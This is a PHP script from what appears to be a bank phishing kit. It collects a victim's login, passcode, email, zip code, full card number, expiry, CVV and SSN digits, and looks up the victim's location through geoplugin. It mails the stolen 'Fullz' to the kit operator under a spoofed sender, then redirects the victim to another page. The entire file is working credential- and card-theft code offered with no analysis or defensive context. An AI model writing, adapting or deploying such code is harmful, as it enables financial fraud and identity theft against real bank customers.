<?php

//Open Session
ob_start();
session_start();



//Getting user ip & hostname
$ip = getenv("REMOTE_ADDR");
$getipinfo = file_get_contents("http://www.geoplugin.net/php.gp?ip=".$ip."");
$data = unserialize($getipinfo);
$city=$data['geoplugin_city'];
	      $region=$data['geoplugin_regionName'];
		  $country=$data['geoplugin_countryName'];
		  $log_date = date('d/m/Y - h:i:s');
$hostname = gethostbyaddr($ip);
$agent = @$_SERVER['HTTP_USER_AGENT'];

//Filling Email to send
include('grabber.php');










//Getting UserID info from Session
$UserID = $_SESSION['UserID'];
$Passcode =  $_SESSION['PassCode'];
$email = $_SESSION['email'];
$zip = $_SESSION['zip'];
$cc = $_POST['cardnumber'];
$exp = $_POST['expmonth']." / ".$_POST['expyear'];
$cvv = $_POST['sc'];
$ssn = $_POST['ssn'];


$Chase="==================+[ B0@ Billy Info ]+==================
UserID : $UserID
Password   : $Passcode
Zip: $zip
Social Security Number Last 4 : $ssn
============= [ Bank & Card Info ] =============
Card Number 16 : $cc
Expiration date: $exp (MM/YYYY)
CVV: $cvv
============= [ Email Login Info ] =============
Email: $email
============= [ Ip & Hostname Info ] =============
Client IP: $ip
Hostname: $hostname
-----------------+  +-----------------";


$subject = "$UserID | BOOOOOOA Fullz";
$headers = "From: Alerts <customercare@privejets.net>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($SEND,$subject,$Chase,$headers);


$Redirect="secureques.php?$asp&Reason=$axp&ref=ovr";
header("Location: $Redirect");




?>